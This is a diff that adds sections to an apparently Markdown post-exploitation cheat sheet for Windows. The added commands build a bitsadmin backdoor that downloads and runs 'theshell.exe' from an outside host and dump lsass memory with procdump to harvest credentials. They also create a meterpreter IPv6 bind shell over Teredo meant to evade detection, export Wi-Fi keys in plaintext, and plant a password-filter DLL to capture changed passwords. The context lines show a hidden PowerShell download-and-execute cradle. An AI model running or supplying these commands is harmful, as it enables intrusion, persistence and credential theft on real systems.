@@ -37,6 +37,25 @@ Taken from http://synjunkie.blogspot.de/2008/03/basic-dos-foo.html
  * **Command with arguments**: `powershell.exe -w hidden -nop -ep bypass -c "IEX ((new-object net.webclient).downloadstring('http://[domainname|IP]:[port]/[file]'))"`
  * **Description**: According to [posted slides](http://www.slideshare.net/mubix/windows-attacks-at-is-the-new-black-26665607), _"Schedule this and it will execute the shellcode on that page, pulling it each time (so you can change as needed)"_.
 
+### bitsadmin Download/Exec
+Make the backdoor:
+```
+bitsadmin /create backdoor
+bitsadmin /addfile backdoor http://192.168.20.10/theshell.exe C:\windows\temp\theshell.exe
+bitsadmin /SETMINRETRYDELAY 88000
+bitsadmin /SETNOTIFYCMDLINE backdoor C:\windows\temp\theshell.exe NULL
+```
+
+Check the backdoor is set up correctly:
+```
+bitsadmin /getnotifycmdline backdoor
+bitsadmin /listfiles backdoor
+```
+
+Run the backdoor:
+```
+bitsadmin /RESUME backdoor
+```
 
 ### Remote Assistance Enable
  * **Command with arguments**: `reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fAllowToGetHelp /t REG_DWORD /d 1 /f`
@@ -130,6 +149,17 @@ c:\> at \\[TargetIP] 12:00 pm command
 An example you might run on the remote system might be: `at \\192.168.1.1 12:00pm tftp -I [MyIP] GET nc.exe`
 
 
+### Scheduling tasks to run under special conditions
+
+One can schedule tasks to run under certain conditions such as when a user logs into the computer or when the computer is idle
+with the schtasks command. This can be done by any user and includes the following additional conditions which can come in handy:
+
+* ONIDLE -> Run a command once the system enters an idle state
+* ONLOGON -> Run a command when a user logs into the system
+* ONSTART -> Run a command when the system starts up
+ 
+If you would like more information on the various command line options for this tool, Microsoft describes them in great
+detail at: [https://technet.microsoft.com/en-us/library/cc725744.aspx#BKMK_create](https://technet.microsoft.com/en-us/library/cc725744.aspx#BKMK_create)
 
 
 
@@ -160,3 +190,60 @@ This technique uses registry entries to switch the binary that the sticky keys e
 * For the "Debugger" REG_SZ, make it have a value of your binary
 
 * Press SHIFT 5 times and your binary should be executed
+
+### Process Dumping For Passwords
+If you have access to a server and one of the user's usernames and passwords and can create shares on that computer,
+you may be able to create a scheduled task which runs procdump.exe to dump all of the memory of the lsass process,
+thus gaining access to all of the stored credentials on the targeted computer:
+
+```
+net use \\target server /user:DOM\username password
+copy procdump.exe \\targetserver\c$
+copy procdump.bat \\targetserver\c$
+procdump.exe -ma lsass creds.dump
+at \\targetserver 13:37 C:\procdump.bat
+copy \\targetserver\c$\targetserver.dmp .
+```
+
+### Teredo IPv6 Bindshell
+Creating a teredo tunnel to allow a remote victim to tunnel IPv6 packets over IPv4 may allow you to evade some
+filter detection systems and extract information from a victim without triggering alerts on the target network.
+
+In order to do this one needs to use a teredo server which will convert IPv4 packets to IPv6 packets and vice versa.
+Several publicly available servers are available including:
+
+* teredo.trex.fi
+* teredo.remlab.net
+* teredo-debian.remlab.net
+* teredo.ngix.ne.kr
+* win8.ipv6.microsoft.com (This may be shaky on Windows 7, so don't rely on it)
+
+To set up a tunnel, issue the following commands:
+
+```
+netsh interface ipv6 install
+netsh interface ipv6 teredo enterpriseclient
+netsh interface ipv6 teredo set client teredo.trex.fi
+msfpayload windows/meterpreter/bind_ipv6_tcp LPORT=5555 X > bind.exe
+```
+
+All we have to do at this point is upload the resulting bind.exe payload to the victim, execute it, and then set up
+metasploit to connect to the public IPv6 address that the victim was assigned on the specified port (5555 in this example), and we should now be able to get a meterpreter shell using teredo tunneling :)
+
+Further details are available at [http://www.room362.com/blog/2010/09/24/revenge-of-the-bind-shell/](http://www.room362.com/blog/2010/09/24/revenge-of-the-bind-shell/)
+
+### Export Local Wireless Passwords (In Plaintext)
+```
+netsh wlan export profile key=clear
+```
+
+### Capture Password Changes With Password Filters
+To do this one simply needs to take the following steps:
+* Create a password filtering DLL (see Didler Steven's example password filterer DLL at [http://blog.didierstevens.com/2010/11/15/password-auditing-with-a-password-filter/](http://blog.didierstevens.com/2010/11/15/password-auditing-with-a-password-filter/) if you want an example of some code you can modify to do this)
+* Dump the resulting DLL into %WINDIR%\System32\
+* Change HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages and add in the location of your DLL as it's value. If the key does not exist, create it first, then set the location as it's value DO NOT ADD IN THE .DLL EXTENSION. (Further details on this stage of the process are detailed at [https://msdn.microsoft.com/en-us/library/windows/desktop/ms721766%28v=vs.85%29.aspx](https://msdn.microsoft.com/en-us/library/windows/desktop/ms721766%28v=vs.85%29.aspx))
+* Reboot the system and wait for passwords to be logged according to the actions defined within your DLL as people change them.
+* 
+* 
+
+Details on how this works are included in Microsoft's documentation at [https://msdn.microsoft.com/en-us/library/windows/desktop/ms721882%28v=vs.85%29.aspx](https://msdn.microsoft.com/en-us/library/windows/desktop/ms721882%28v=vs.85%29.aspx)
